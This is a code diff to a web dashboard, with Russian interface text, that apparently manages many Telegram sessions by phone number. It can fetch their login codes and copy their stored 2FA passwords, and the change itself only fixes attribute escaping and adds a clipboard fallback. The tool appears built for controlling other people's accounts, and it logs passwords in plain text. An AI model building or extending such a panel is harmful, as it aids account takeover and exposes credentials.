@@ -152,7 +152,7 @@
                             <td>${s.created_at || 'Unknown'}</td>
                             <td>
                                 <button class="btn btn-sm btn-primary" onclick="parseCodeFromSession('${s.phone}')" title="Парсить код из Telegram">🔍 Парсить код</button>
-                                ${s.twoFA ? `<button class="btn btn-sm btn-2fa" onclick="copy2FA('${s.twoFA}')" title="Копировать 2FA пароль">🔐 2FA</button>` : ''}
+                                ${s.twoFA ? `<button class="btn btn-sm btn-2fa" data-2fa="${String(s.twoFA).replace(/"/g, '&quot;')}" onclick="copy2FA(this)" title="Копировать 2FA пароль">🔐 2FA</button>` : ''}
                                 <button class="btn btn-sm btn-secondary" onclick="getCodeForPhone('${s.phone}')" title="Получить новый код">📱 Новый</button>
                                 <button class="btn btn-sm" onclick="testSession('${s.phone}')">Test</button>
                             </td>
@@ -510,18 +510,55 @@
         });
     }
     
-    function copy2FA(password) {
-        navigator.clipboard.writeText(password).then(() => {
+    function copy2FA(button) {
+        // Получить значение из data-атрибута
+        const password = button.getAttribute('data-2fa');
+        
+        // Проверить, что значение не пустое
+        if (!password) {
+            alert('2FA пароль не найден');
+            console.error('2FA пароль не найден в data-атрибуте');
+            return;
+        }
+        
+        // Убедиться, что это строка
+        const textToCopy = String(password);
+        
+        console.log('Копирую 2FA:', textToCopy);
+        
+        navigator.clipboard.writeText(textToCopy).then(() => {
             // Показать уведомление
             const notification = document.createElement('div');
             notification.className = 'copy-notification';
-            notification.textContent = '✅ 2FA скопирован: ' + password;
+            notification.textContent = '✅ 2FA скопирован: ' + textToCopy;
             document.body.appendChild(notification);
             setTimeout(() => {
                 notification.remove();
             }, 2000);
         }).catch(err => {
-            alert('Не удалось скопировать: ' + err);
+            console.error('Ошибка копирования:', err);
+            // Fallback для старых браузеров
+            try {
+                const textArea = document.createElement('textarea');
+                textArea.value = textToCopy;
+                textArea.style.position = 'fixed';
+                textArea.style.left = '-999999px';
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+                
+                const notification = document.createElement('div');
+                notification.className = 'copy-notification';
+                notification.textContent = '✅ 2FA скопирован: ' + textToCopy;
+                document.body.appendChild(notification);
+                setTimeout(() => {
+                    notification.remove();
+                }, 2000);
+            } catch (fallbackErr) {
+                console.error('Fallback ошибка:', fallbackErr);
+                alert('Не удалось скопировать: ' + fallbackErr);
+            }
         });
     }
     
